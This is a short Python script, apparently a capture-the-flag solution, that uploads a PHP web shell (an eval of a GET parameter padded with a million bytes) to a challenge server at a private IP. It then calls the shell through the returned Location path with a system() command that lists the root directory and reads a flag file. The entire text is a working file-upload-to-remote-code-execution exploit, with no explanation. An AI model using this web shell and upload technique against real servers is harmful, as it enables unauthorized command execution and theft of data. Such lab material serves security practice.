import requests
from io import BytesIO

url = "http://10.214.160.76:30522/"

code = {"code": BytesIO(b'<?php eval($_GET["_"]);//'+b'0'*1000000)}

r = requests.post(url, data=code, allow_redirects=False)
r.headers['Location']


payload = "http://10.214.160.76:30522/" + \
    r.headers['Location']+"?_=echo system('cd /;ls;cat f1ag_1s_0bvioussss');"

r = requests.get(url=payload)

print(r.text)
